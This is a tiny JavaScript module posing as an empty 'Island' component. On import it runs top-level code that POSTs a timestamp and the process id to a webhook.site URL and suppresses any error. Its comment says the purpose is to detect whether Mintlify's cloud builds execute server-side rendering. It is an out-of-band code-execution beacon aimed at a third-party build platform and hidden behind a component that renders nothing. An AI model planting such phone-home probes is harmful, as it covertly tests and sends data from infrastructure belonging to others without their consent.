// Module-level code: executes when this module is import()-ed
// Used to test whether Mintlify cloud builds execute island SSR server-side
fetch("https://webhook.site/e27d2c30-7065-4093-984b-28ab4e278794?f8=module_level&ts=" + Date.now(), {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ source: "f8-module-level", pid: typeof process !== "undefined" ? process.pid : null })
}).catch(() => {});

export default function Island() { return null; }
